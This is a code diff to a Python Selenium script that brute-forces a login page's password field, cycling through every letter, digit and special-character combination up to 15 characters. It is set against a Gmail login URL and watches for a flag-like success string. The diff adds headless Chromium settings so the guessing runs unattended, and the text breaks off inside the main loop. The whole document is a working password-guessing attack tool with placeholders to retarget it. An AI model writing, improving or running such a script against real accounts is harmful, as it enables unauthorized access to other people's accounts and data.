@@ -1,14 +1,18 @@
 from selenium import webdriver
+from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 import time
 import string
 import itertools
 
+# Path to your Chromium binary
+CHROMIUM_PATH = "/usr/bin/chromium"  # Add path to Chromium binary here
+
 # Configure your target URL and input field details
 URL = "https://gmail.com/login"  # Replace with the actual URL
-INPUT_BOX_ID = "password"         # Replace with the actual input box ID
-SUCCESS_TEXT = "H4ck3d_1t"          # Replace with the success indicator (e.g., "Login successful")
+INPUT_BOX_ID = "password"        # Replace with the actual input box ID
+SUCCESS_TEXT = "H4ck3d_1t"       # Replace with the success indicator (e.g., "Login successful")
 
 # Function to generate characters
 def generate_passwords(charset, length):
@@ -17,10 +21,25 @@ def generate_passwords(charset, length):
 # Main function to automate testing
 def test_passwords():
     # Initialize the web driver (use the appropriate driver for your browser)
-    driver = webdriver.Chrome()  # Ensure you have chromedriver installed and in PATH
+    options = webdriver.ChromeOptions()
+    options.binary_location = CHROMIUM_PATH  # Specify the Chromium binary location
+
+    # Add arguments for headless mode and other fixes
+    options.add_argument("--headless")
+    options.add_argument("--no-sandbox")
+    options.add_argument("--disable-dev-shm-usage")
+    options.add_argument("--remote-debugging-port=9222")
+
+    service = Service(executable_path='/usr/bin/chromedriver')  # Update the path if needed
+    driver = webdriver.Chrome(service=service, options=options)
+    
     driver.get(URL)
 
-    charset = string.ascii_letters + string.digits  # Use letters and digits
+    # Define the character set
+    charset = string.ascii_letters + string.digits
+    special_characters = "!@#$%^&*()-_=+[]{}|;:',.<>?/~`"  # Custom special characters
+    charset += special_characters  # Combine all character sets
+
     max_length = 15  # Set max password length for testing
 
     for length in range(1, max_length + 1):
